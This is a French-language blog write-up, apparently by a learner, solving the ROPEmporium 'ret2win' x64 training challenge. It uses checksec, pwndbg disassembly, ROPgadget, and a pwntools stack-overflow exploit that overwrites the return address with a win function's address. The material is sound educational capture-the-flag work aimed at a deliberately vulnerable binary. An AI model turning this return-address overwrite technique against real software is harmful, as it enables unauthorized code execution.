<!DOCTYPE html>
<html lang="en">
  <head>
    
      <title>
        üá´üá∑ ROPEmporium - ret2win (x64) ::
        infosec blog
      </title>
    
    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<meta
  name="description"
  content="Note # Je suis actuellement entrain d&amp;rsquo;apprendre le pwn donc il est possible que je fasse des erreurs ou que je dise des choses fausses dans ce post, si vous en voyez n&amp;rsquo;h√©sitez pas √† me contacter sur discord.
File information # Avant de commencer √† regarder dans l&amp;rsquo;executable, il faut savoir √† quoi on s&amp;rsquo;attaque, on va utiliser file pour avoir des informations sur le fichier, puis checksec pour voir les √©ventuelles s√©curit√©es avec lesquelles il a √©t√© compil√©"
/>
<meta
  name="keywords"
  content="infosec writeups french cybersec"
/>
<meta name="robots" content="noodp" />
<link rel="canonical" href="/post/ropemporium-ret2win-x64/" />







<link rel="stylesheet" href="/css/style.css" />

<link rel="stylesheet" href="/style.css" />


<link rel="apple-touch-icon-precomposed" sizes="144x144" href="/img/apple-touch-icon-144-precomposed.png" />
<link rel="shortcut icon" href="/img/favicon.png" />


<link href="/fonts/Inter-Italic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
<link href="/fonts/Inter-Regular.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
<link href="/fonts/Inter-Medium.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
<link href="/fonts/Inter-MediumItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
<link href="/fonts/Inter-Bold.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
<link href="/fonts/Inter-BoldItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">


<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="üá´üá∑ ROPEmporium - ret2win (x64)"/>
<meta name="twitter:description" content="Mon premier writeup en pwn sur l&#39;exercice ret2win de ropemporium.com"/>



<meta property="og:title" content="üá´üá∑ ROPEmporium - ret2win (x64)" />
<meta property="og:description" content="Mon premier writeup en pwn sur l&#39;exercice ret2win de ropemporium.com" />
<meta property="og:type" content="article" />
<meta property="og:url" content="/post/ropemporium-ret2win-x64/" /><meta property="article:section" content="post" />
<meta property="article:published_time" content="2023-01-14T00:00:00+00:00" />
<meta property="article:modified_time" content="2023-01-14T00:00:00+00:00" /><meta property="og:site_name" content="infosec blog" />






  </head>
  <body class="dark-theme">
    <div class="container">
      <header class="header">
  <span class="header__inner">
    <a
  href="/"
  class="logo"
  style="text-decoration: none;"
>
  
    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
  <path fill="none" d="M15 8l14.729 14.382L15 35.367" />
</svg>
</span>
    <span class="logo__text"
      >c0nfl1c7</span
    >
    <span class="logo__cursor"></span>
  
</a>

    <span class="header__right">
      
        <nav class="menu">
  <ul class="menu__inner menu__inner--desktop">
    
      
        
          <li><a href="/about">About</a></li>
        
      
        
          <li><a href="/archive">Archive</a></li>
        
      
      
      
  </ul>

  <ul class="menu__inner menu__inner--mobile">
    
      
        <li><a href="/about">About</a></li>
      
    
      
        <li><a href="/archive">Archive</a></li>
      
    
  </ul>
</nav>

        <span class="menu-trigger">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
            <path d="M0 0h24v24H0z" fill="none" />
            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z" />
          </svg>
        </span>
      
      <span class="theme-toggle">
        <svg
  class="theme-toggler"
  width="24"
  height="24"
  viewBox="0 0 48 48"
  fill="none"
  xmlns="http://www.w3.org/2000/svg"
>
  <path
    d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"
  />
</svg>

      </span>
    </span>
  </span>
</header>


      <div class="content">
        
  
  

  <article class="post">
    <h1 class="post-title">üá´üá∑ ROPEmporium - ret2win (x64)</h1>
    <div class="post-meta">
      
        <time class="post-date">
          14-01-2023
        </time>

        
          
        
      

      
        <span class="post-author"
          >‚Äî √©crit par conflict</span
        >


      
        <span class="post-read-time"
          >‚Äî 4 minute(s) de lecture</span
        >
      
    </div>

    

    

    <div class="post-content">
      
      <h1 id="note">
  Note
  <a href="#note" class="h-anchor" aria-hidden="true">#</a>
</h1>
<p>Je suis actuellement entrain d&rsquo;apprendre le pwn donc il est possible que je fasse des erreurs ou que je dise des choses fausses dans ce post, si vous en voyez n&rsquo;h√©sitez pas √† me contacter sur <a href="https://discord.com/users/254689803822563348">discord</a>.</p>
<h1 id="file-information">
  File information
  <a href="#file-information" class="h-anchor" aria-hidden="true">#</a>
</h1>
<p>Avant de commencer √† regarder dans l&rsquo;executable, il faut savoir √† quoi on s&rsquo;attaque, on va utiliser <code>file</code> pour avoir des informations sur le fichier, puis <code>checksec</code> pour voir les √©ventuelles s√©curit√©es avec lesquelles il a √©t√© compil√©</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>file ret2win
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>ret2win: ELF 64-bit LSB executable, x86-64, version <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>SYSV<span style="color:#f92672">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span style="color:#66d9ef">for</span> GNU/Linux 3.2.0, BuildID<span style="color:#f92672">[</span>sha1<span style="color:#f92672">]=</span>19abc0b3bb228157af55b8e16af7316d54ab0597, not stripped
</span></span></code></pre></div><p>On va donc s&rsquo;attaquer √† un executable en 64bit, link√© dynamiquement et qui n&rsquo;est pas stripp√©</p>
<p>Maintenant le <code>checksec</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-css" data-lang="css"><span style="display:flex;"><span><span style="color:#f92672">checksec</span> <span style="color:#f92672">ret2win</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">Arch</span><span style="color:#f92672">:</span>     <span style="color:#f92672">amd64-64-little</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">RELRO</span><span style="color:#f92672">:</span>    <span style="color:#f92672">Partial</span> <span style="color:#f92672">RELRO</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">Stack</span><span style="color:#f92672">:</span>    <span style="color:#f92672">No</span> <span style="color:#f92672">canary</span> <span style="color:#f92672">found</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">NX</span><span style="color:#f92672">:</span>       <span style="color:#f92672">NX</span> <span style="color:#f92672">enabled</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">PIE</span><span style="color:#f92672">:</span>      <span style="color:#f92672">No</span> <span style="color:#f92672">PIE</span> <span style="color:#f92672">(</span><span style="color:#f92672">0x400000</span><span style="color:#f92672">)</span>
</span></span></code></pre></div><h1 id="exploitation">
  Exploitation
  <a href="#exploitation" class="h-anchor" aria-hidden="true">#</a>
</h1>
<p>On va le run et voir ce qu&rsquo;il se passe</p>
<p><img src="https://user-images.githubusercontent.com/77807503/212438458-863bbd90-ce7f-4af6-bdd0-e56ac4a6ba7f.png" alt="2023-01-13-194951_1041x663_scrot"></p>
<p>En lisant ce que le programme √©crit on apprend plusieurs choses:</p>
<ul>
<li>La taille du buffer o√π est stock√© notre input: 32 bytes</li>
<li>La fonction read() est utilis√©e pour lire notre input</li>
<li>read() va lire 56 bytes au maximum</li>
</ul>
<p>On va pouvoir overflow le buffer puisqu&rsquo;on peut √©crire un nombre de bytes sup√©rieur √† la taille du buffer</p>
<p>Voici donc le d√©but de notre exploit:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> binary <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./ret2win&#34;</span>, checksec<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> process()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recv()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>padding <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">32</span>
</span></span><span style="display:flex;"><span>rbp <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;B&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> padding <span style="color:#f92672">+</span> rbp
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
</span></span></code></pre></div><p>Ici, on d√©clare deux variables, une qui correspond au padding n√©cessaire pour remplir le buffer (padding), et une qui correspond au padding pour overwrite la sauvegarde de <code>rbp</code> (rbp)</p>
<p>On envoie ensuite notre payload mais en l&rsquo;occurence ici il ne va rien se passer puisque <code>rip</code> n&rsquo;a pas √©t√© overwrite.</p>
<p>La prochaine √©tape est de lister les symboles de l&rsquo;executable pour trouver notre fonction &ldquo;win&rdquo; (une fonction qui va nous permettre de lire le flag). Pour faire √ßa, on peut utiliser <code>pwndbg</code> par exemple:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>pwndbg<span style="color:#f92672">&gt;</span> info functions
</span></span><span style="display:flex;"><span>	All defined functions:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	Non<span style="color:#f92672">-</span>debugging symbols:
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">0x0000000000400528</span>  _init
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">0x0000000000400550</span>  puts<span style="color:#a6e22e">@plt</span>
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">0x0000000000400560</span>  system<span style="color:#a6e22e">@plt</span>
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">0x0000000000400570</span>  printf<span style="color:#a6e22e">@plt</span>
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">0x0000000000400580</span>  memset<span style="color:#a6e22e">@plt</span>
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">0x0000000000400590</span>  read<span style="color:#a6e22e">@plt</span>
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">0x00000000004005a0</span>  setvbuf<span style="color:#a6e22e">@plt</span>
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">0x00000000004005b0</span>  _start
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">0x00000000004005e0</span>  _dl_relocate_static_pie
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">0x00000000004005f0</span>  deregister_tm_clones
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">0x0000000000400620</span>  register_tm_clones
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">0x0000000000400660</span>  __do_global_dtors_aux
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">0x0000000000400690</span>  frame_dummy
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">0x0000000000400697</span>  main
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">0x00000000004006e8</span>  pwnme
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">0x0000000000400756</span>  ret2win
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">0x0000000000400780</span>  __libc_csu_init
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">0x00000000004007f0</span>  __libc_csu_fini
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">0x00000000004007f4</span>  _fini
</span></span></code></pre></div><p>Une fonction sort du lot: <code>ret2win</code> (situ√©e √† l&rsquo;adresse <code>0x0000000000400756</code>)</p>
<p>On va donc regarder ce qu&rsquo;elle fait plus en d√©tail, toujours avec <code>pwndbg</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>pwndbg<span style="color:#f92672">&gt;</span> disass ret2win
</span></span><span style="display:flex;"><span>	Dump of assembler code <span style="color:#66d9ef">for</span> function ret2win:
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">0x0000000000400756</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">0</span><span style="color:#f92672">&gt;</span>:	push   rbp
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">0x0000000000400757</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">1</span><span style="color:#f92672">&gt;</span>:	mov    rbp,rsp
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">0x000000000040075a</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">4</span><span style="color:#f92672">&gt;</span>:	mov    edi,<span style="color:#ae81ff">0x400926</span>
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">0x000000000040075f</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">9</span><span style="color:#f92672">&gt;</span>:	call   <span style="color:#ae81ff">0x400550</span> <span style="color:#f92672">&lt;</span>puts<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">0x0000000000400764</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">14</span><span style="color:#f92672">&gt;</span>:	mov    edi,<span style="color:#ae81ff">0x400943</span>
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">0x0000000000400769</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">19</span><span style="color:#f92672">&gt;</span>:	call   <span style="color:#ae81ff">0x400560</span> <span style="color:#f92672">&lt;</span>system<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">0x000000000040076e</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">24</span><span style="color:#f92672">&gt;</span>:	nop
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">0x000000000040076f</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">25</span><span style="color:#f92672">&gt;</span>:	pop    rbp
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">0x0000000000400770</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">26</span><span style="color:#f92672">&gt;</span>:	ret    
</span></span><span style="display:flex;"><span>	End of assembler dump<span style="color:#f92672">.</span>
</span></span></code></pre></div><p>Il y a 2 <code>call</code>, un sur <code>puts</code> et un sur <code>system</code>. On voit qu&rsquo;il passe un argument √† <code>system</code>, situ√© √† l&rsquo;adresse <code>0x400943</code></p>
<p>On va donc regarder ce qui se trouve √† cette adresse:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>	pwndbg<span style="color:#f92672">&gt;</span> x<span style="color:#f92672">/</span>s <span style="color:#ae81ff">0x400943</span>
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">0x400943</span>:	<span style="color:#e6db74">&#34;/bin/cat flag.txt&#34;</span>
</span></span></code></pre></div><p>Ok, donc c&rsquo;est effectivement notre fonction win, puisqu&rsquo;elle passe <code>&quot;/bin/cat flag.txt&quot;</code> en argument dans <code>system()</code>.</p>
<p>L&rsquo;id√©e va donc √™tre d&rsquo;ajouter l&rsquo;adresse de cette fonction √† la fin de notre payload, pour qu&rsquo;elle finisse dans <code>rip</code> (rip est l&rsquo;instruction pointer, il pointe vers la prochaine instruction √† √©xecuter, qui sera en l&rsquo;occurence la fonction <code>ret2win</code>)</p>
<p>On peut compl√©ter notre exploit:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> binary <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./ret2win&#34;</span>, checksec<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> process()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recv()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>padding <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">32</span>
</span></span><span style="display:flex;"><span>rbp <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;B&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>
</span></span><span style="display:flex;"><span>rip <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x00400756</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> padding <span style="color:#f92672">+</span> rbp <span style="color:#f92672">+</span> rip
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;flag:&#34;</span>,p<span style="color:#f92672">.</span>recvall()<span style="color:#f92672">.</span>split(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)[<span style="color:#ae81ff">2</span>]<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;utf-8&#39;</span>))
</span></span></code></pre></div><p>Maintenant, on lance l&rsquo;exploit et on devrait avoir le flag</p>
<p><img src="https://user-images.githubusercontent.com/77807503/212438841-fe612582-a330-472b-ba9b-c9fa7f237d8f.png" alt="2023-01-13-201012_1135x146_scrot"></p>
<p>Et&hellip; le flag n&rsquo;a pas √©t√© print car le programme a <code>segfault</code>. Puisque je suis sous Ubuntu 22.04, qui est une version ult√©rieure √† la 18.04 je suis affect√© par les probl√®mes de <strong>stack alignment</strong> (MOVAPS)</p>
<p>Pour r√©gler √ßa, on peut ajouter un gadget <code>ret</code>, qu&rsquo;on va trouver en utilisant <code>ROPgadget</code> apr√®s notre padding</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>ROPgadget <span style="color:#f92672">--</span>binary ret2win <span style="color:#f92672">|</span> grep ret
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x000000000040053e</span> : ret
</span></span></code></pre></div><p>Maintenant qu&rsquo;on a l&rsquo;addresse du <code>ret</code> on peut l&rsquo;ajouter √† notre payload, et il devrait fonctionner cette fois. Voici donc la version finale de l&rsquo;exploit</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> binary <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./ret2win&#34;</span>, checksec<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> process()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recv()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>padding <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">32</span>
</span></span><span style="display:flex;"><span>rbp <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;B&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>
</span></span><span style="display:flex;"><span>rip <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x00400756</span>)
</span></span><span style="display:flex;"><span>ret <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x000000000040053e</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> padding <span style="color:#f92672">+</span> rbp <span style="color:#f92672">+</span> ret <span style="color:#f92672">+</span> rip
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;flag:&#34;</span>,p<span style="color:#f92672">.</span>recvall()<span style="color:#f92672">.</span>split(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)[<span style="color:#ae81ff">2</span>]<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;utf-8&#39;</span>))
</span></span></code></pre></div><p><img src="https://user-images.githubusercontent.com/77807503/212439094-3d54ce77-a9d1-485a-afe7-f1ae7bd3dea2.png" alt="2023-01-13-201337_1023x371_scrot"></p>
<p>Et on a le flag, gg!</p>

    </div>
    
      
        <div class="pagination">
          <div class="pagination__title">
            <span class="pagination__title-h"
              >voir d&#39;autres posts</span
            >
            <hr />
          </div>
          <div class="pagination__buttons">
            
            
              <span class="button next">
                <a href="/post/thm-blog/">
                  <span class="button__text">üá´üá∑ TryHackMe - Blog</span>
                  <span class="button__icon">‚Üí</span>
                </a>
              </span>
            
          </div>
        </div>
      
    

    
      
        

      
    
  </article>

      </div>

      
        <footer class="footer">
  <div class="footer__inner">
    
      <div class="copyright copyright--user">rami malek en personne</div>
      
  </div>
</footer>





<script type="text/javascript" src="/bundle.min.js"></script>


      
    </div>

    
  </body>
</html>
